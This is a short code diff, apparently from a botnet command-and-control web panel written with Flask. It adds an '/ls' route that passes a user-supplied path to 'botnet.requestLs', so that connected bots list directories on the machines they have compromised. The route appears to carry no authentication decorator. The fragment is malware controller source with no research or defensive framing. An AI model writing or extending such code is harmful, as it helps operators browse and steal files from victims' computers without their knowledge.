@@ -69,6 +69,15 @@ def download_file():
         # response.headers["Content-Disposition"] = "attachment; filename={}".format(filename)
         return response
 
+@app.route('/ls', methods=['GET','POST'])
+def list_dir():
+    if request.method == 'POST':
+        filename = request.form.get('file')
+    else:
+        filename = '.'
+    botnet.requestLs(connected, filename)
+    return "done"
+
 def requires_auth(f):
     @wraps(f)
     def decorated(*args, **kwargs):
